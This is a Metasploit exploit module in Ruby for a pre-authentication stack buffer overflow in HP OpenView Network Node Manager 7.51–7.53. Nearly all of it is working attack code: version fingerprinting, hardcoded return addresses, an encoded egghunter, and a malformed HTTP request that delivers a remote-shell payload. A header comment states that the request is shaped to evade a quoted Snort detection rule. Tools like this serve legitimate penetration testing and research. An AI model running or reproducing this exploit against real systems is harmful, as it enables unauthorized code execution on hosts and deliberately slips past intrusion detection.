##
# $Id: hp_nnm_ovas.rb 10660 2010-10-12 18:39:21Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This should bypass the following snort rule referenced from web-misc.rules (10/17/2008)
# alert tcp $EXTERNAL_NET any -> $HOME_NET 7510 (msg:"WEB-MISC HP OpenView Network Node Manager HTTP handling buffer overflow attempt"; flow:to_server,established; content:"GET "; depth:4; nocase; isdataat:165,relative; content:"/topology/homeBaseView"; pcre:"/GET\s+\w[^\x0a\x20]{165}/i"; metadata:policy balanced-ips drop, policy security-ips drop; reference:bugtraq,28569; reference:cve,2008-1697; classtype:attempted-admin; sid:13715; rev:3;)
# Newer versions of this rule might find this but we've taken steps to atleast bypass this rule
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking
	# =( need more targets and perhaps more OS specific return values OS specific would be preferred

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'	=> 'HP OpenView NNM 7.53, 7.51 OVAS.EXE Pre-Authentication Stack Buffer Overflow',
			'Description'	=> %q{
					This module exploits a stack buffer overflow in HP OpenView Network Node Manager versions 7.53 and earlier.
				Specifically this vulnerability is caused by a failure to properly handle user supplied input within the
				HTTP request including headers and the actual URL GET request.

				Exploitation is tricky due to character restrictions. It was necessary to utilize a egghunter shellcode
				which was alphanumeric encoded by muts in the original exploit.

				If you plan on using exploit this for a remote shell, you will likely want to migrate to a different process
				as soon as possible. Any connections get reset after a short period of time. This is probably some timeout
				handling code that causes this.
			},
			'Author'	=>
				[
					'bannedit',
					# muts wrote the original exploit and did most of the initial work
					# credit where credit is due. =)
					'muts'
				],

			'Version' => '$Revision: 10660 $',
			'References' =>
				[
					[ 'CVE', '2008-1697' ],
					[ 'OSVDB', '43992' ],
					[ 'BID', '28569' ],
				],
			'DefaultOptions' =>
				{
					'WfsDelay' => 45,
					'EXITFUNC' => 'thread',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload' =>
				{
					'Space'		=> 1000,
					'BadChars'	=> "\x0a\x0d\x00",
					'StackAdjustment'	=> -3500,
				},
			'Platform' => 'win',
			'Privileged' => true,
			'Targets' =>
				[
					# need more but this will likely cover most cases
					[ 'Automatic Targeting',
						{
							'auto' => true
						}
					],

					[ 'Windows 2003/zip.dll OpenView 7.53',
						{
							'Ret' => 0x6d633757  # pop pop ret
						}
					],

					[ 'Windows 2000/jvm.dll OpenView NNM 7.51',
						{
							'Ret' => 0x6d356c6e  # pop pop ret
						}
					]
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Apr 02 2008'))

		register_options(
			[
				Opt::RPORT(7510),
				OptString.new('UserAgent', [ true, "The HTTP User-Agent sent in the request", 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N' ])
			], self.class)
	end


	def exploit

		targ = target

		if (target['auto'])
			print_status("Detecting the remote version...")
			resp = send_request_raw({'uri' => '/topology/home'}, 5)
			if resp.nil?
				print_status("No response to request")
				return Exploit::CheckCode::Safe
			end

			case resp.body
				when /NNM Release B.07.53/
					targ = targets[1]
				when /NNM Release B.07.51/
					targ = targets[2]
				else
					raise RuntimeError, "Unable to determine a target automatically..."
					# if snmp is running you could set the target based on community strings

			end
		end
		print_status("Using target: #{targ.name}")
		exploit_target(targ)
	end


	def exploit_target(targ)

		# we have to use an egghunter in this case because of the restrictions
		# on the characters we can use.
		# we are using skape's egghunter alpha numeric encoded by muts
		egghunter =
			'%JMNU%521*TX-1MUU-1KUU-5QUUP\AA%J'+
			'MNU%521*-!UUU-!TUU-IoUmPAA%JMNU%5'+
			'21*-q!au-q!au-oGSePAA%JMNU%521*-D'+
			'A~X-D4~X-H3xTPAA%JMNU%521*-qz1E-1'+
			'z1E-oRHEPAA%JMNU%521*-3s1--331--^'+
			'TC1PAA%JMNU%521*-E1wE-E1GE-tEtFPA'+
			'A%JMNU%521*-R222-1111-nZJ2PAA%JMN'+
			'U%521*-1-wD-1-wD-8$GwP'

		print_status("Constructing the malformed http request")

		buf = "http://"
		buf << "\xeb" * 1101		# this gets mangled in such a way we can use less input
		buf << "\x41" * 4			# sometimes less really is more
		buf << "\x77\x21" 		# \xeb is restricted so we use a conditional jump which is always taken
		buf << [targ.ret].pack('V')
		buf << "G" * 32
		buf << egghunter
		buf << "\x41" * 100
		buf << ":#{datastore['RPORT']}"

		# T00W is the egg
		payload_buf = "T00WT00W" + make_nops(34) + "\x83\xc4\x03" + payload.encoded

		begin
			connect
			resp = send_request_raw({
					'uri'     => buf + "/topology/home",
					'version' => '1.1',
					'method' => 'GET',
					'headers' =>
						{
							'Content-Type' => 'application/x-www-form-urlencoded',
							'User-Agent' => datastore['UserAgent'],
						},
					'data' => payload_buf
				})
		rescue ::Rex::ConnectionError, ::Errno::ECONNRESET, ::Errno::EINTR
			# do nothing let the exploit live this catches the
			# connection reset by peer error which is expected
		end

		if not resp.nil?
			raise RuntimeError, "The server responded, that wasn't supposed to happen!"
		end

		print_status("Malformed http request sent.")
		print_status("Now we wait for the egg hunter to work it's magic. thx skape!")
		handler
		disconnect
	end


	def check

		resp = send_request_raw({'uri' => '/topology/home'}, 5)
		if resp.nil?
			print_status("No response to request")
			return Exploit::CheckCode::Safe
		end

		if (resp.body =~ /NNM Release B.07.53/ || resp.body =~ /NNM Release B.07.52/ || resp.body =~ /NNM Release B.07.51/)
			return Exploit::CheckCode::Appears
		end

		return Exploit::CheckCode::Safe

	end

end
